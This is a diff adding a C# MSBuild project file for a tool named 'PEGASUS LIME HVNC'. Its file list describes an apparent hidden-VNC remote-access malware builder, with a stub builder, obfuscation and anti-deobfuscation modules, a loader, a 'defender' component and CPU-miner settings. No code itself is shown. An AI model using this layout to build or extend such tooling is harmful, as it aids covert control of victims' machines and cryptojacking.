@@ -1,0 +1,325 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProjectGuid>{404515A0-4830-4126-9404-7B9B94F80A05}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>PEGASUS LIME HVNC</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <LangVersion>9</LangVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>PEGASUS LIME HVNC.ico</ApplicationIcon>
+    <StartupObject>PEGASUS_LIME.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <LangVersion>latest</LangVersion>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>0</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <LangVersion>latest</LangVersion>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="bunifu.licensing">
+      <HintPath>..\..\DLL\bunifu.licensing.dll</HintPath>
+    </Reference>
+    <Reference Include="bunifu.ui.winforms.1.5.3">
+      <HintPath>..\..\DLL\bunifu.ui.winforms.1.5.3.dll</HintPath>
+    </Reference>
+    <Reference Include="bunifu.ui.winforms.bunifuseparator">
+      <HintPath>..\..\DLL\bunifu.ui.winforms.bunifuseparator.dll</HintPath>
+    </Reference>
+    <Reference Include="bunifu.ui.winforms.bunifutransition">
+      <HintPath>..\..\DLL\bunifu.ui.winforms.bunifutransition.dll</HintPath>
+    </Reference>
+    <Reference Include="dnlib">
+      <HintPath>..\..\DLL\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="guna.ui2">
+      <HintPath>..\..\DLL\guna.ui2.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="mono.cecil">
+      <HintPath>..\..\DLL\mono.cecil.dll</HintPath>
+    </Reference>
+    <Reference Include="newtonsoft.json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\DLL\newtonsoft.json.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Xml.Serialization" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="AnimateMsgBox.cs" />
+    <Compile Include="custom_alert_notifications\alert.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\AnimateMsgBox.cs" />
+    <Compile Include="HVNC\FrmBuilder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmBuilderStatus.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmMassUpdate.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmRegister.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmTransfer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmURL.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\FrmVNC.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\MsgBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC\Utils\BuildInfo.cs" />
+    <Compile Include="HVNC\Utils\Utils.cs" />
+    <Compile Include="HVNC\WebBuilder\WebBuilder.cs" />
+    <Compile Include="InputDialog.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="LoyalListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="LoyalListViewColumnHeader.cs" />
+    <Compile Include="LoyalListViewItem.cs" />
+    <Compile Include="LoyalListViewSubItem.cs" />
+    <Compile Include="LoyalScrollBar.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="MsgBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Design\Login.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\EncryptString.cs" />
+    <Compile Include="PEGASUS\LIME\UnderGround_Algorithmos\AES.cs" />
+    <Compile Include="PEGASUS\LIME\UnderGround_Algorithmos\Aes256.cs" />
+    <Compile Include="PEGASUS\LIME\UnderGround_Algorithmos\CryptographyHelper.cs" />
+    <Compile Include="PEGASUS\LIME\UnderGround_Algorithmos\GetHash.cs" />
+    <Compile Include="PEGASUS\LIME\UnderGround_Algorithmos\GZip.cs" />
+    <Compile Include="PEGASUS\LIME\UnderGround_Algorithmos\Sha256.cs" />
+    <Compile Include="PEGASUS\LIME\UnderGround_Algorithmos\Zip.cs" />
+    <Compile Include="PEGASUS\MessagePack\BytesTools.cs" />
+    <Compile Include="PEGASUS\MessagePack\Client.cs" />
+    <Compile Include="PEGASUS\MessagePack\MsgPack.cs" />
+    <Compile Include="PEGASUS\MessagePack\MsgPackArray.cs" />
+    <Compile Include="PEGASUS\MessagePack\MsgPackEnum.cs" />
+    <Compile Include="PEGASUS\MessagePack\MsgPackType.cs" />
+    <Compile Include="PEGASUS\MessagePack\ReadTools.cs" />
+    <Compile Include="PEGASUS\MessagePack\Server.cs" />
+    <Compile Include="PEGASUS\MessagePack\WriteTools.cs" />
+    <Compile Include="PEGASUS\VNCForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\Boh8oi\ListViewColumnSorter.cs" />
+    <Compile Include="PEGASUS_LIME\Boh8oi\ListviewDoubleBuffer.cs" />
+    <Compile Include="PEGASUS_LIME\Boh8oi\NativeMethods.cs" />
+    <Compile Include="PEGASUS_LIME\Controls\AeroListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\Controls\ByteConverter.cs" />
+    <Compile Include="PEGASUS_LIME\Controls\HexEditor\ByteCollection.cs" />
+    <Compile Include="PEGASUS_LIME\Controls\HexEditor\Caret.cs" />
+    <Compile Include="PEGASUS_LIME\Controls\HexEditor\EditView.cs" />
+    <Compile Include="PEGASUS_LIME\Controls\HexEditor\HexEditor.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\Controls\HexEditor\HexViewHandler.cs" />
+    <Compile Include="PEGASUS_LIME\Controls\HexEditor\IKeyMouseEventHandler.cs" />
+    <Compile Include="PEGASUS_LIME\Controls\HexEditor\StringViewHandler.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Classes\Base64.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Classes\Class1.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Classes\ClassesRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Classes\DecryptionHelper.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Classes\FieldsRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Classes\InjectHelper.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Classes\MethodsRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Classes\NamespacesRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Classes\PropertiesRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Classes\Utils.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Interfaces\ICrypto.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Interfaces\IRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\AddInteger.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\AntiDe4Dot.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\CFHelper.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Ovelkill.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Protections\ControlFlow.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Protections\CryptoRandom.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Protections\IntEncoding.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Protections\L2F.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Protections\Renamer.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Protections\StringEncryption.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\ProxyInts.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\Analyzer\DefAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\Analyzer\EventDefAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\Analyzer\FieldDefAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\Analyzer\MethodDefAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\Analyzer\ParameterAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\Analyzer\PropertyDefAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\InjectContext.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\InjectHelper.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\MemberRenamer.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\Randomizer.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Overkill\Utils\StringDecoder.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Algorithmos\Renaming.cs" />
+    <Compile Include="PEGASUS_LIME\Design\AnimateMsgBox.cs" />
+    <Compile Include="PEGASUS_LIME\Design\FormAbout.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\Design\Log.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\Design\MsgBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\Design\PEGASUS.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\Design\Utils\Methods.cs" />
+    <Compile Include="PEGASUS_LIME\Design\Welcome.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Classes\Base64.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Classes\ClassesRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Classes\DecryptionHelper.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Classes\FieldsRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Classes\InjectHelper.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Classes\MethodsRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Classes\NamespacesRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Classes\PropertiesRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Classes\Utils.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\EncryptString.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Interfaces\ICrypto.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Interfaces\IRenaming.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Loader\Config.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Loader\Extensions.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Loader\LoaderConfig.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Loader\ReplacementAttribute.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Loader\SourceBuilder.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\AddInteger.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\AntiDe4Dot.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\CFHelper.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Ovelkill.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Protections\ControlFlow.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Protections\CryptoRandom.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Protections\IntEncoding.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Protections\L2F.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Protections\Renamer.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Protections\StringEncryption.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\ProxyInts.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\Analyzer\DefAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\Analyzer\EventDefAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\Analyzer\FieldDefAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\Analyzer\MethodDefAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\Analyzer\ParameterAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\Analyzer\PropertyDefAnalyzer.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\InjectContext.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\InjectHelper.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\MemberRenamer.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\Randomizer.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Overkill\Utils\StringDecoder.cs" />
+    <Compile Include="PEGASUS_LIME\PegasusTwister\Renaming.cs" />
+    <Compile Include="PEGASUS_LIME\Program.cs" />
+    <Compile Include="PEGASUS_LIME\Properties\All.Designer.cs">
+      <DependentUpon>All.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\Properties\CPUMiner.Designer.cs">
+      <DependentUpon>CPUMiner.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\Properties\Resources.cs" />
+    <Compile Include="PEGASUS_LIME\Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="PEGASUS_LIME\Skoteinos_Pegasus\api.cs" />
+    <Compile Include="PEGASUS_LIME\Skoteinos_Pegasus\DAPI.cs" />
+    <Compile Include="PEGASUS_LIME\Skoteinos_Pegasus\defender.cs" />
+    <Compile Include="PEGASUS_LIME\Skoteinos_Pegasus\encryption.cs" />
+    <Compile Include="PEGASUS_LIME\Skoteinos_Pegasus\json_wrapper.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Stub\Copikolo.cs" />
+    <Compile Include="Stub\Pikolo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="custom_alert_notifications\alert.resx" />
+    <EmbeddedResource Include="HVNC\FrmBuilder.resx" />
+    <EmbeddedResource Include="HVNC\FrmBuilderStatus.resx" />
+    <EmbeddedResource Include="HVNC\FrmMassUpdate.resx" />
+    <EmbeddedResource Include="HVNC\FrmRegister.resx" />
+    <EmbeddedResource Include="HVNC\FrmTransfer.resx" />
+    <EmbeddedResource Include="HVNC\FrmURL.resx" />
+    <EmbeddedResource Include="HVNC\FrmVNC.resx" />
+    <EmbeddedResource Include="InputDialog.resx" />
+    <EmbeddedResource Include="PEGASUS\Design\Login.resx" />
+    <EmbeddedResource Include="PEGASUS\VNCForm.resx" />
+    <EmbeddedResource Include="PEGASUS_LIME\Design\FormAbout.resx" />
+    <EmbeddedResource Include="PEGASUS_LIME\Design\Log.resx" />
+    <EmbeddedResource Include="PEGASUS_LIME\Design\PEGASUS.resx" />
+    <EmbeddedResource Include="PEGASUS_LIME\Design\Welcome.resx" />
+    <EmbeddedResource Include="PEGASUS_LIME\PegaZeus\one.key" />
+    <EmbeddedResource Include="PEGASUS_LIME\PegaZeus\two.key" />
+    <EmbeddedResource Include="PEGASUS_LIME\Properties\Resources.resx">
+      <DependentUpon>Resources.cs</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="PEGASUS_LIME\Properties\All.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>All.Designer.cs</LastGenOutput>
+    </None>
+    <None Include="PEGASUS_LIME\Properties\CPUMiner.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>CPUMiner.Designer.cs</LastGenOutput>
+    </None>
+    <None Include="PEGASUS_LIME\Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
